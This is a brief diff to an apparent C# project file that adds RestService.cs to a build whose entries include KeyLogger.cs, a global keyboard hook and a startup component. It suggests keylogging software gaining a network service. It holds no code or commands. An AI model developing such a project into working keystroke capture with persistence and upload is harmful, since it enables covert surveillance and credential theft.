@@ -57,6 +57,7 @@
     <Compile Include="GlobalKeyboardHookEventArgs.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="RestService.cs" />
     <Compile Include="StartupApp.cs" />
     <EmbeddedResource Include="KeyLogger.resx">
       <DependentUpon>KeyLogger.cs</DependentUpon>
